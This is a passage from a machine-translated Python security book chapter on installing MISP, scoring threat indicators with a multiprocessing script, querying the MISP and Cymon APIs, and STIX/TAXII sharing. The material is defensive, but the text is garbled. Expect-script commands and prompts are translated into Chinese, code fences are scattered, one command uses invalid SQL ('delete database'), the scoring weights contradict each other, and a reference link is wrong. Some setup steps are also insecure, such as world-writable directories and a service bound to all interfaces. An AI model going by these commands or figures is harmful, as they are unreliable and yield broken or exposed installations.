期望"输入 root 的当前密码（不输入则为空）："

发送 -- "\r"

期望"设置 root 密码？"

发送 -- "y\r"

期望"新密码："

发送 -- "${DBPASSWORD_ADMIN}\r"

期望"重新输入新密码："

发送 -- "${DBPASSWORD_ADMIN}\r"

期望"删除匿名用户？"

发送 -- "y\r"

期望"禁止远程 root 登录？"

发送 -- "y\r"

期望"删除测试数据库和对其的访问权限？"

发送 -- "y\r"

期望"现在重新加载权限表？"

发送 -- "y\r"

期望 eof

EOF

sudo yum remove tcl expect -y

# 此外，让数据库服务器只在本地侦听可能是一个好主意

echo [mysqld] |sudo tee /etc/my.cnf.d/bind-address.cnf

echo bind-address=127.0.0.1 |sudo tee -a /etc/my.cnf.d/bind-address.cnf

sudo systemctl restart mariadb.service

# 进入 mysql shell

mysql -u root -p

```py
```

MariaDB [(none)]> create database misp;

MariaDB [(none)]> grant usage on *.* to misp@localhost identified by 'XXXXXXXXX';

MariaDB [(none)]> grant all privileges on misp.* to misp@localhost ;

MariaDB [(none)]> 退出

```py
#### copy/paste:
```bash

sudo mysql -u $DBUSER_ADMIN -p$DBPASSWORD_ADMIN -e "create database $DBNAME;"

sudo mysql -u $DBUSER_ADMIN -p$DBPASSWORD_ADMIN -e "grant usage on *.* to $DBNAME@localhost identified by '$DBPASSWORD_MISP';"

sudo mysql -u $DBUSER_ADMIN -p$DBPASSWORD_ADMIN -e "grant all privileges on $DBNAME.* to '$DBUSER_MISP'@'localhost';"

sudo mysql -u $DBUSER_ADMIN -p$DBPASSWORD_ADMIN -e "flush privileges;"

```py
```

1.  从`MYSQL.sql`导入空的 MySQL 数据库如下：

```py
```bash sudo -u apache cat $PATH_TO_MISP/INSTALL/MYSQL.sql | mysql -u $DBUSER_MISP -p$DBPASSWORD_MISP $DBNAME

```py
```

1.  接下来，配置您的 Apache 服务器：

```py
!!! notice
SELinux note, to check if it is running:
```bash

$ sestatus

SELinux 状态：已禁用

```py
If it is disabled, you can ignore the **chcon/setsebool/semanage/checkmodule/semodule*** commands.

!!! warning
This guide only copies a stock **NON-SSL** configuration file.

```bash

# 现在使用 DocumentRoot /var/www/MISP/app/webroot/配置您的 apache 服务器

# 可以在/var/www/MISP/INSTALL/apache.misp.centos7 中找到一个示例 vhost

sudo cp /var/www/MISP/INSTALL/apache.misp.centos7.ssl /etc/httpd/conf.d/misp.ssl.conf

# 如果服务器尚未创建有效的 SSL 证书，请创建自签名证书：

sudo openssl req -newkey rsa:4096 -days 365 -nodes -x509 \

-subj "/C=${OPENSSL_C}/ST=${OPENSSL_ST}/L=${OPENSSL_L}/O=${OPENSSL_O}/OU=${OPENSSL_OU}/CN=${OPENSSL_CN}/emailAddress=${OPENSSL_EMAILADDRESS}" \

-keyout /etc/pki/tls/private/misp.local.key -out /etc/pki/tls/certs/misp.local.crt

# 由于启用了 SELinux，我们需要允许 httpd 写入某些目录

sudo chcon -t usr_t /var/www/MISP/venv

sudo chcon -t httpd_sys_rw_content_t /var/www/MISP/app/files

sudo chcon -t httpd_sys_rw_content_t /var/www/MISP/app/files/terms

sudo chcon -t httpd_sys_rw_content_t /var/www/MISP/app/files/scripts/tmp

sudo chcon -t httpd_sys_rw_content_t /var/www/MISP/app/Plugin/CakeResque/tmp

sudo chcon -R -t usr_t /var/www/MISP/venv

sudo chcon -R -t httpd_sys_rw_content_t /var/www/MISP/app/tmp

sudo chcon -R -t httpd_sys_rw_content_t /var/www/MISP/app/tmp/logs

sudo chcon -R -t httpd_sys_rw_content_t /var/www/MISP/app/webroot/img/orgs

sudo chcon -R -t httpd_sys_rw_content_t /var/www/MISP/app/webroot/img/custom

```py

!!! warning
Revise all permissions so update in Web UI works.

```bash

sudo chcon -R -t httpd_sys_rw_content_t /var/www/MISP/app/tmp

# 允许 httpd 通过 tcp/ip 连接到 redis 服务器和 php-fpm

sudo setsebool -P httpd_can_network_connect on

# 启用并启动 httpd 服务

sudo systemctl enable httpd.service

sudo systemctl start httpd.service

# Open a hole in the iptables firewall

sudo firewall-cmd --zone=public --add-port=80/tcp --permanent

sudo firewall-cmd --zone=public --add-port=443/tcp --permanent

sudo firewall-cmd --reload

# We seriously recommend using only HTTPS / SSL !

# Add SSL support by running: sudo yum install mod_ssl

# Check out the apache.misp.ssl file for an example

```py
 !!! warning
 To be fixed - Place holder 
```

1.  To rotate these logs, install the supplied `logrotate` script:

```py
```bash

# MISP saves the stdout and stderr of it's workers in /var/www/MISP/app/tmp/logs

# To rotate these logs install the supplied logrotate script:

sudo cp $PATH_TO_MISP/INSTALL/misp.logrotate /etc/logrotate.d/misp

sudo chmod 0640 /etc/logrotate.d/misp

# Now make logrotate work under SELinux as well

# Allow logrotate to modify the log files

sudo semanage fcontext -a -t httpd_log_t "/var/www/MISP/app/tmp/logs(/.*)?"

sudo chcon -R -t httpd_log_t /var/www/MISP/app/tmp/logs

# Allow logrotate to read /var/www

sudo checkmodule -M -m -o /tmp/misplogrotate.mod $PATH_TO_MISP/INSTALL/misplogrotate.te

sudo semodule_package -o /tmp/misplogrotate.pp -m /tmp/misplogrotate.mod

sudo semodule -i /tmp/misplogrotate.pp

```py
```

1.  Run the following script to configure the MISP instance:

```py
```bash

# There are 4 sample configuration files in $PATH_TO_MISP/app/Config that need to be copied

sudo -u apache cp -a $PATH_TO_MISP/app/Config/bootstrap.default.php $PATH_TO_MISP/app/Config/bootstrap.php

sudo -u apache cp -a $PATH_TO_MISP/app/Config/database.default.php $PATH_TO_MISP/app/Config/database.php

sudo -u apache cp -a $PATH_TO_MISP/app/Config/core.default.php $PATH_TO_MISP/app/Config/core.php

sudo -u apache cp -a $PATH_TO_MISP/app/Config/config.default.php $PATH_TO_MISP/app/Config/config.php

echo "<?php;?>

class DATABASE_CONFIG {

public \$default = array(

'datasource' => 'Database/Mysql',

//'datasource' => 'Database/Postgres',

'persistent' => false,

'host' => '$DBHOST',

'login' => '$DBUSER_MISP',

'port' => 3306, // MySQL & MariaDB

//'port' => 5432, // PostgreSQL

'password' => '$DBPASSWORD_MISP',

'database' => '$DBNAME',

'prefix' => '',

'encoding' => 'utf8',

);

}" | sudo -u apache tee $PATH_TO_MISP/app/Config/database.php

# Configure the fields in the newly created files:

# config.php : baseurl (example: 'baseurl' => 'http://misp',) - don't use "localhost" it causes issues when browsing externally

# core.php : Uncomment and set the timezone: `// date_default_timezone_set('UTC');`

# database.php : login, port, password, database

# DATABASE_CONFIG has to be filled

# With the default values provided in section 6, this would look like:

# class DATABASE_CONFIG {

# public $default = array(

# 'datasource' => 'Database/Mysql',

# 'persistent' => false,

# 'host' => 'localhost',

# 'login' => 'misp', // grant usage on *.* to misp@localhost

# 'port' => 3306,

# 'password' => 'XXXXdbpasswordhereXXXXX', // identified by 'XXXXdbpasswordhereXXXXX';

# 'database' => 'misp', // create database misp;

# 'prefix' => '',

# 'encoding' => 'utf8',

# );

#}

```py

Change the salt key in `/var/www/MISP/app/Config/config.php`. The admin user account will be generated on the first login; make sure that the salt is changed before you create that user. If you forget to do this step, and you are still dealing with a fresh installation, just alter the salt.
Delete the user from MYSQL and log in again using the default admin credentials (`admin@admin.test/admin`).

13.  If you want to change the configuration parameters from the web interface, run the following script and proceed by generating a GPG encryption key:

```

sudo chown apache:apache /var/www/MISP/app/Config/config.php

sudo chcon -t httpd_sys_rw_content_t /var/www/MISP/app/Config/config.php

# Generate a GPG encryption key.

cat >/tmp/gen-key-script <<EOF

%echo Generating a default key

Key-Type: default

Key-Length: $GPG_KEY_LENGTH

Subkey-Type: default

Name-Real: $GPG_REAL_NAME

Name-Comment: $GPG_COMMENT

Name-Email: $GPG_EMAIL_ADDRESS

Expire-Date: 0

Passphrase: $GPG_PASSPHRASE

# Do a commit here, so that we can later print "done"

%commit

%echo done

EOF

sudo gpg --homedir /var/www/MISP/.gnupg --batch --gen-key /tmp/gen-key-script

sudo rm -f /tmp/gen-key-script

sudo chown -R apache:apache /var/www/MISP/.gnupg

# And export the public key to the webroot

sudo gpg --homedir /var/www/MISP/.gnupg --export --armor $GPG_EMAIL_ADDRESS |sudo tee /var/www/MISP/app/webroot/gpg.asc

sudo chown apache:apache /var/www/MISP/app/webroot/gpg.asc

# Start the workers to enable background jobs

sudo chmod +x /var/www/MISP/app/Console/worker/start.sh

sudo -u apache $RUN_PHP /var/www/MISP/app/Console/worker/start.sh

if [ ! -e /etc/rc.local ]

then

echo '#!/bin/sh -e' | sudo tee -a /etc/rc.local

echo 'exit 0' | sudo tee -a /etc/rc.local

sudo chmod u+x /etc/rc.local

fi

sudo sed -i -e '$i \su -s /bin/bash apache -c "scl enable rh-php71 /var/www/MISP/app/Console/worker/start.sh" > /tmp/worker_start_rc.local.log\n' /etc/rc.local

# 确保它将被执行

sudo chmod +x /etc/rc.local

echo "Admin (root) DB Password: $DBPASSWORD_ADMIN"

echo "User (misp) DB Password: $DBPASSWORD_MISP"

```py
```

# 一些 misp-modules 依赖项

sudo yum install -y openjpeg-devel

sudo chmod 2777 /usr/local/src

sudo chown root:users /usr/local/src

cd /usr/local/src/

git clone https://github.com/MISP/misp-modules.git

cd misp-modules

# pip install

sudo -u apache $PATH_TO_MISP/venv/bin/pip install -I -r REQUIREMENTS

sudo -u apache $PATH_TO_MISP/venv/bin/pip install .

sudo yum install rubygem-rouge rubygem-asciidoctor -y

##sudo gem install asciidoctor-pdf --pre

# 安装 STIX2.0 库以支持 STIX 2.0 导出：

sudo -u apache $PATH_TO_MISP/venv/bin/pip install stix2

# 安装扩展对象生成和提取的其他依赖项

sudo -u apache ${PATH_TO_MISP}/venv/bin/pip install maec lief python-magic pathlib

sudo -u apache ${PATH_TO_MISP}/venv/bin/pip install git+https://github.com/kbandla/pydeep.git

# 启动 misp-modules

sudo -u apache ${PATH_TO_MISP}/venv/bin/misp-modules -l 0.0.0.0 -s &

sudo sed -i -e '$i \sudo -u apache /var/www/MISP/venv/bin/misp-modules -l 127.0.0.1 -s &\n' /etc/rc.local

```py
 {!generic/MISP_CAKE_init_centos.md!}
 {!generic/INSTALL.done.md!}
 {!generic/recommended.actions.md!}
 {!generic/hardening.md!}
```

# 威胁评分能力

一旦所有依赖关系都得到解决，并且工具设置好了，我们将需要通过增强 MISP 后端系统来扩展 IOC 威胁评分能力。值得注意的是，MISP 并不具备开箱即用的威胁评分能力，这是 SIEM 的一个非常重要的功能。我们对 MISP 后端系统/代码库所做的改进是确保我们可以在 MISP 之上构建 IOC 威胁评分能力。为了适应这一点，我们在后端创建了一个名为`threat_scoring`的表。该表记录了每个 IOC 的适当威胁评分。

设置数据库后，让我们打开 MySQL 控制台，并按以下方式删除 MISP 数据库：

```py
mysql -u <username> -p <password>
delete database misp;
create database misp;
exit
```

一旦我们执行这些命令，我们现在需要将修改后的数据库模式添加到新创建的`misp`数据库中。可以按以下方式将其添加到后端系统中：

```py
mysql -u <username> -p misp < mod_schema.sql
```

执行上述命令后，我们将拥有 MISP 后端数据库的更新实例。mod_schema.sql 可以在本章的 GITHUB URL 中找到。

# MISP UI 和 API

MISP 具有基于 PHP 的前端，可以通过 Web 浏览器访问。它带有许多重要功能。您可以参考原始网站，了解所有这些功能的完整概念：[`www.misp-project.org/`](https://www.misp-project.org/)。在本节中，让我们看看一些关键功能，这些功能将让我们了解如何使用 MISP 实施威胁情报并收集 IOCs。

一旦我们登录到门户，我们可以转到源选项卡，查看 MISP 中预先配置的源。值得注意的是，源只是提供 JSON、CSV、XML 或平面文件格式的 IOCs 的基于 Web 的本地来源。MISP 中预先配置了各种源。一旦我们安排了源收集作业，MISP 的中央引擎就会访问所有配置的源，从中提取 IOCs，并将它们放入中央数据库，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/78cf1144-82b5-4ed1-82ec-ab2699255fe4.png)

如前面的屏幕截图所示，我们可以转到**添加源**选项卡，并从那里配置更多的源。

在下面的屏幕截图中，我们可以看到从配置的源下载和解析源的中央调度程序。我们可以选择一天、一周或一年中的任何时间，指示我们希望何时下载源。我们还可以配置调度程序重复的频率：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/3c18b6f0-82a1-4d0a-afe7-767fa9a8c0ba.png)

我们将专注于前面截图中的突出显示的行。在第二行，我们有一个**fetch_feeds**作业。双击频率和计划时间/日期字段可以让我们更改设置。此外，应该注意到前面突出显示的`threat_scoring`行不是 MISP 的默认安装内容。我们通过修改后端数据库注入了这个（我们在改进部分中介绍了这一点）。

一旦订阅被下载和解析，它们被放置在一个虚拟/逻辑实体中，称为**事件**。MISP 中的事件可以被视为 IOC 的集合。我们可以为不同的订阅创建单独的事件。或者，我们可以将所有基于 IP 的 IOC 放入单独的事件中，域名等等。以下截图显示了事件集合：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/07d5218a-be03-4f51-a296-3f12b6af5d76.png)

如果我们点击前面截图中任何一个事件的详细信息图标，我们将看到该特定事件实际持有的 IOC。这在以下截图中显示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/51b3f11b-c2a3-4fc5-ac74-6098366115d5.png)

# MISP API（PyMISP）

如前所述，MISP 配备了一个非常稳定的 API，我们可以通过它在 MISP 中获取事件和被称为属性的 IOC，并与我们的安全工具共享。API 需要设置身份验证密钥。身份验证密钥可以在用户通过 MISP Web 门户登录时找到。这里展示了如何使用 MISP API 从 MISP 后端数据库获取特定事件的详细信息的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/76d37a28-0ab8-4af5-af61-4a60ac213c79.png)

MISP API 的完整详情可以在以下链接找到：[`github.com/MISP/PyMISP/tree/2c882c1887807ef8c8462f582415470448e5d68c/examples`](https://github.com/MISP/PyMISP/tree/2c882c1887807ef8c8462f582415470448e5d68c/examples)。

在前面的代码片段中，我们只是在第 31 行初始化了 MISP API 对象，并调用了`get_api` API 方法。前面的代码可以按如下方式运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6e0cc825-dda5-4853-a0bc-96239fd62a7f.png)

如前面的截图所示，我们得到了与`1512`事件 ID 相关联的所有 IOC。如果我们指定`out`参数，输出也可以保存在 JSON 文件中。

# 威胁评分

正如我们之前讨论过的，威胁评分是威胁情报的一个非常重要的部分。通常收集到数百万个 IOC，它们通常包含大量的误报。如果这些信息直接输入到 SIEM 工具中，将导致大量的误报警报。为了解决这个问题，我们尝试编写一个算法，该算法在 MISP 收集的 IOC 之上工作，并为每个 IOC 关联一个威胁评分。这个想法是，在 10 分制上得分为五分或更高的 IOC 更有可能是真正恶意的 IOC，并且应该输入到 SIEM 中。这个算法工作的威胁评分标准如下所示：

+   **日期**：IOC 的日期占 30%的权重。如果一个 IOC 是一到三个月前的，它将获得 30%的全部 100%，即 3 分。如果是四个月前，它将获得 90%，或 2.9 分，依此类推。完整的细节将在下一节中给出。

+   **相关性**：IOC 的相关性计数占权重的 54%。我们所说的相关性是指在多个事件或多个数据源中出现的频率。假设我们配置了 30 个数据源，每个数据源的 IOC 都会进入不同的事件，结果就是 30 个事件。现在，如果有一个 IOC 在所有 30 个事件中都出现，这表明该 IOC 极有可能是高度恶意的，因为有 30 个不同的来源引用了它。这个 IOC 将获得相关性分配的整个 54%权重，即 5.4 分。如果一个 IOC 出现在 90%的配置数据源中，它将获得相应数量的分数。相关性权重的实际分配将在以下部分给出。

+   **标签**：许多 IOC 数据源会使用与其关联的活动类型对 IOC 进行标记，例如扫描、僵尸网络和钓鱼网站。标签所占权重为 15%。需要注意的是，该部分根据与 IOC 关联的标签数量而非标签类型进行工作。标签数量越多，占 15%权重的分数就越高。

+   **评论**：最后，剩下的 1%分配给标签部分。一些 IOC 也带有特定的评论。如果一个 IOC 有相关评论，它将获得整个 1%，即 0.1 分，如果没有，它在这一部分将获得 0 分。

# 威胁评分加权文件

这些标准并未硬编码在程序逻辑中，而是在 JSON 文件中配置，以便用户可以随时更改它们，代码将获取更新后的值并相应地分配分数。我们在 JSON 文件中设置了以下值：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/daf94c06-d9c7-4e1e-bf1f-59a7146b9f92.png)

如前面的截图所示，`标签`的权重为 15%。这在 8-12 行进一步分配。第 8 行表示任何具有最少五个标签和最多 10,000 个标签的 IOC 将获得整个 15%。第 9 行表示任何具有四个标签的 IOC 将获得 15%的 90%，依此类推。

`日期`也有类似的分配。最多 30 分，任何 0 到 90 天的 IOC 都将获得整个 30 分的 100%，即 3 分。任何 91-100 天的 IOC 将获得 30 分的 90%，即 2.7 分，依此类推。

`相关性`的权重为 54%，如下截图所示。在相关性的情况下，权重的分配有些不同。第 41 行的数字 35 并不表示绝对数量，而是一个百分比。这意味着在配置的总数据源中，如果一个 IOC 在 35%的数据源或事件中被发现，那么它应该获得整个 5.4 分。其他行可以类似地解释。

最后，还有 1%的权重分配给 IOC 是否带有任何评论：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/8552eea4-487d-47b1-8bf3-826fd82b24fc.png)

# 威胁评分算法

看一下我们编写的以下代码，用于对 MISP IOC 集合进行威胁评分。完整的代码可以在以下链接找到：[`github.com/PacktPublishing/Hands-On-Penetration-Testing-with-Python`](https://github.com/PacktPublishing/Hands-On-Penetration-Testing-with-Python)：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/e737aa5e-64ba-479c-9982-6201a6a9eece.png)

让我们试着理解到目前为止编写的代码。这段代码利用了我们在本书中学到的概念。其想法是从 MISP `attributes`后端表中读取所有 IOCs，并根据之前讨论的逻辑为每个 IOCs 赋予威胁分数。现在，有数百万个属性，所以如果我们尝试按顺序读取它们并对它们进行评分，将需要很长时间。这就是 Python 在多进程方面的优势所在。我们将读取所有属性，并根据底层机器的处理器核心将属性分成相等的块。每个处理器核心将一次性处理一个块。它还将为属于该块的 IOCs 分配威胁分数。我使用的硬件具有 8GB 的 RAM 和 4 核处理器。

假设我们总共有 200 万个属性，这些属性将被分成四个块，每个块将包含 50 万个属性。评分过程将由专用处理器核心在该块上执行。如果对 200 万个块进行顺序操作需要 4 小时，那么多进程方法将需要 1 小时。在 40 和 51 行之间编写的逻辑负责确定我们将使用的块的总数。它还包含推断块大小的逻辑，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/899cd852-6bcc-4b6e-8223-c1f7877b8d4b.png)

应该注意的是，在第 5 行导入的模块`from DB_Layer.Misp_access import MispDB`代表一个名为`MISPDB`的自定义类，声明在`MISP_access.py`模块中。该类具有从`misp`数据库中提取数据的原始 SQL 代码。

在 54 和 56 行之间，我们将块放入一个名为`limit_offset`的自定义列表中。假设我们在后端数据库表中有 200 万个属性。在第 56 行之后，该列表将更新如下：

```py
limit_offset=[{"offset":0,"limit":500000},{"offset":500000,"limit":500000},{"offset":1000000,"limit":500000},{"offset":1500000,"limit":500000}]
```

在 61 和 64 行之间，我们为每个块调用一个单独的进程。进程将执行的方法是`StartProcessing()`，我们将当前块作为参数传递。在剩余的 69-97 行中，我们正在更新状态以将状态代码返回给调用`UpdateThreatScore()`方法的代码。让我们来看一下处理器核心执行的方法：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/7a234eb7-5432-4944-b272-f6f9ab167d24.png)

以下代码的核心逻辑位于第 186 行，代码接受当前块并调用`self.Scoring()`方法。该方法通过组合每个属性的标签、相关性、日期和注释威胁分数产生威胁分数。最后，一旦获得累积分数，它将更新后端`threat_scoring`数据库表。这在下面的片段中显示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/88243024-a2ea-4d99-a1b3-49809a0ec11f.png)![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/e9571b63-e818-4336-9f89-8ca2b9854ec3.png)

如图所示，`Scoring()`方法在 130-133 行下进一步调用四种不同的方法。它将分数总结并将其推送到数据库表中。让我们看一下它调用的四种方法： 

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6a03cbb7-42a3-436a-af1f-ae34bd7bcb80.png)

如下截图所示，所有四种方法都从 JSON 文件中读取配置值，并将它们传递给一个名为`ComputeScore`的公共方法，该方法最终根据传递的配置值计算分数并返回计算出的分数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/592aeacb-513c-4776-bd72-b49f73f883f8.png)

以下代码将所有部分连接在一起并返回计算出的分数。该代码将在单独的处理器核心上并行调用所有块：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/de53cecf-76e6-483b-b4b9-c70c13c68106.png)

最后，我们将创建该类的对象并调用`Update`方法，如下所示：

```py
ob=ThreatScore()
ob.UpdateThreatScore()
```

# 执行代码

整个代码可以在以下 GitHub 存储库中找到，[`github.com/PacktPublishing/Hands-On-Penetration-Testing-with-Python`](https://github.com/PacktPublishing/Hands-On-Penetration-Testing-with-Python)，并且可以按如下方式调用：

```py
python3.6 TS.py
```

该代码将所有执行和调试消息放入一个`log`文件中，该文件将自动在相同的文件夹中创建，并称为`TS.log`。一旦代码成功执行，它将具有以下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/defaafd2-3eae-4c08-9347-4e6af961b15f.png)

当代码执行时，有四个并行的读/写操作在数据库上执行，因为每个处理器核心将分别读取和写入。如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/9cefea88-0164-4d30-9ca6-d8891f904035.png)

可以看到，有四个名为`misp`的用户帐户正在尝试同时从数据库中读取和写入。

以下屏幕截图表示了威胁评分表的架构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/0c120729-2415-42ea-b26d-6cf205936074.png)

以下屏幕截图显示了 IOC 的威胁评分。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/3417b7fb-52d5-48a3-a3ee-f7ba1e9a448e.png)

以下屏幕截图显示了一些 IP 地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/52963b02-1dc2-493d-8de3-dc9c158b23c1.png)

# STIX 和 TAXII 和外部查找

STIX 和 TAXII 术语在威胁情报领域中经常被使用。我们将尝试使用以下示例来理解它是什么。

假设我们有一个名为 A 的组织，它拥有大量的威胁情报数据。数据来自外部源以及内部威胁情报数据。组织 A 是一家银行组织，使用平台 X 来存储和管理他们的威胁情报数据。现在，组织 A 希望通过与银行部门中的其他组织（如 B 和 C 组织）共享他们的威胁情报数据来帮助银行社区。他们也希望其他组织也分享他们的数据。问题是，虽然组织 A 使用平台 X 来管理他们的威胁情报数据，但组织 B 和 C 使用完全不同的平台。那么组织 A 如何与 B 和 C 分享其情报呢？这就是 STIX 和 TAXII 派上用场的地方。

STIX 和 TAXII 通过提供一个使用通用格式存储和检索情报的平台来解决威胁情报共享的问题。例如，如果组织 X 需要使用属于组织 Y 的网站，它们将通过组织 Y 使用的 Web 服务器上的 HTTP/HTTPS 协议进行。 HTTP 是由 Web 服务器提供的基于 Web 的信息的通信模式。同样，STIX 是用于交换威胁情报数据的协议，并由称为 TAXII 服务器的服务器提供。TAXII 服务器能够理解 STIX 内容并将其提供给客户端。在细粒度上，STIX 的内容只是一个 XML 文档，它以一定的方式格式化，并带有符合 STIX 格式的特定标记，以便 TAXII 服务器能够理解。这意味着所有使用 TAXII 服务器的组织都将能够在 STIX 协议下共享威胁情报数据。

MISP 还具有与 TAXII 服务器集成的能力。通过 TAXII 服务器在 MISP 中共享的内容被放置在 TAXII 服务器的数据库中，以及在 MISP 数据库中。要获取有关 MISP 和 TAXII 服务器集成的完整详细信息，请参阅官方网址：[`github.com/MISP/MISP-Taxii-Server`](https://github.com/MISP/MISP-Taxii-Server)。

TAXII 服务器有用 Python 编写的客户端，这使得集成无缝且非常容易。就像市场上有不同的 Web 服务器，例如 Apache、nginx 和 Tomcat 一样，TAXII 服务器有一些不同的实现，包括以下内容：

+   [`github.com/eclecticiq/OpenTAXII`](https://github.com/eclecticiq/OpenTAXII)

+   [`github.com/oasis-open/cti-taxii-server`](https://github.com/oasis-open/cti-taxii-server)

+   [`github.com/freetaxii/server`](https://github.com/freetaxii/server)

+   [`github.com/SecurityRiskAdvisors/sra-taxii2-server`](https://github.com/SecurityRiskAdvisors/sra-taxii2-server)

+   [`github.com/StephenOTT/TAXII-springboot-bpmn`](https://github.com/StephenOTT/TAXII-springboot-bpmn)

我们可以在官方 GitHub 存储库中了解每个的功能。了解哪些实现具有哪些功能对您将会很有用。

# 外部查找

有许多付费和开源的外部查找网站暴露了获取有关 IOC 信息的 API。其中一些最著名的包括以下内容：

+   IPvoid：[`www.ipvoid.com/`](http://www.ipvoid.com/)

+   URLvoid：[`www.urlvoid.com/`](https://www.urlvoid.com/)

+   Cymon：[`api.cymon.io/v2/ioc/search/`](https://api.cymon.io/v2/ioc/search/)

+   恶意软件域：[`www.malwaredomainlist.com/mdl.php`](http://www.malwaredomainlist.com/mdl.php)

+   Threat Miner：[`www.threatminer.org/`](https://www.threatminer.org/)

+   Threatcrowd：[`www.threatcrowd.org/`](https://www.threatcrowd.org/)

其中许多都暴露了 API，可以完全自动化 IOC 查找的过程。例如，让我们看一下通过 Cymon 暴露的 API 自动化 IOC 查找的以下代码片段：

```py
import requests 
from urllib.parse import urljoin
from urllib.parse import urlparse
cymon_url='https://api.cymon.io/v2/ioc/search/'
type_="ip-src"
ip="31.148.219.11"
if type_ in ["ip-src","ip-dst","domain|ip","ip-dst|port","ip-src|port","ip"]:
 cymon_url=urljoin(cymon_url,"ip/")
 cymon_url=urljoin(cymon_url,ip)
response = requests.get(cymon_url, data={},  headers=headers)
print(response)
```

我们可以在这些网站上搜索并阅读 API 文档，以便自动化 IOC 针对这些网站的查找过程。

# 总结

在本章中，我们探讨了 Python 在防御安全中的用途。应该注意的是，我们只捕捉了 Python 在防御安全中的一小部分用途。还有许多其他用途，包括编排、自动化重复任务、开发将 IDS/IPS 签名与 Qualys/Nessus CVE 相关联的脚本。本章奠定了 Python 的用途基础，我鼓励读者进行进一步研究。

在下一章中，我们将看到一些其他常见的网络安全用例，其中 Python 非常方便。

# 问题

1.  我们如何进一步改进威胁评分算法？

1.  我们能否使用先前讨论过的威胁评分代码与基于 Python 的调度程序？

# 进一步阅读

+   STIX 和 TAXII：[`threatconnect.com/stix-taxii/`](https://threatconnect.com/stix-taxii/)

+   MISP：[`github.com/longld/peda`](https://github.com/longld/peda)

+   威胁情报：[`www.cisecurity.org/blog/what-is-cyber-threat-intelligence/`](https://www.cisecurity.org/blog/what-is-cyber-threat-intelligence/)
